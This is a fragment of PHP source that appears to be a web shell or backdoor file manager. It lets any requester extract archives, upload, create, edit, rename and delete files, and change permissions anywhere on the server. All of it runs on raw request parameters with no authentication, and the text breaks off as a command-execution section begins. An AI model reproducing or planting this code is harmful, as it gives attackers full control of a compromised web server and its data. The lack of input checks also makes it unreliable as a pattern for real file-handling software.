// Extract ZIP
if (isset($_POST['extract'])) {
    $zipfile = $_POST['zipfile'];
    if (class_exists('ZipArchive')) {
        $zip = new ZipArchive();
        if ($zip->open($zipfile) === TRUE) {
            $zip->extractTo($path);
            $zip->close();
            $msg = "✅ Extracted successfully!";
        } else {
            $msg = "❌ Failed to extract!";
        }
    } else {
        $msg = "❌ ZipArchive not available! Use terminal: unzip " . basename($zipfile);
    }
}

// Delete
if (isset($_GET['delete'])) {
    $del = $_GET['delete'];
    if (is_file($del)) @unlink($del);
    elseif (is_dir($del)) @rmdir($del);
    header("Location: ?path=" . urlencode(dirname($del)));
    exit();
}

// Upload
if (isset($_FILES['file']) && $_FILES['file']['error'] == 0) {
    move_uploaded_file($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name']);
    $msg = "✅ Uploaded: " . $_FILES['file']['name'];
    header("Location: ?path=" . urlencode($path));
    exit();
}

// Create Folder
if (isset($_POST['mkdir']) && !empty($_POST['folder'])) {
    @mkdir($path . '/' . $_POST['folder'], 0777, true);
    header("Location: ?path=" . urlencode($path));
    exit();
}

// Create File
if (isset($_POST['create_file']) && !empty($_POST['filename'])) {
    file_put_contents($path . '/' . $_POST['filename'], $_POST['content'] ?? '');
    header("Location: ?path=" . urlencode($path));
    exit();
}

// Save Edit
if (isset($_POST['save_file'])) {
    file_put_contents($_POST['file'], $_POST['content']);
    $msg = "✅ File saved!";
    header("Location: ?path=" . urlencode(dirname($_POST['file'])));
    exit();
}

// Rename
if (isset($_POST['rename']) && isset($_POST['old']) && isset($_POST['new'])) {
    @rename($_POST['old'], dirname($_POST['old']) . '/' . $_POST['new']);
    header("Location: ?path=" . urlencode(dirname($_POST['old'])));
    exit();
}

// Chmod
if (isset($_POST['chmod_submit']) && isset($_POST['chmod_file']) && isset($_POST['chmod_perms'])) {
    @chmod($_POST['chmod_file'], octdec($_POST['chmod_perms']));
    $msg = "✅ Chmod applied!";
    header("Location: ?path=" . urlencode(dirname($_POST['chmod_file'])));
    exit();
}

// Command
$cmd_output = '';
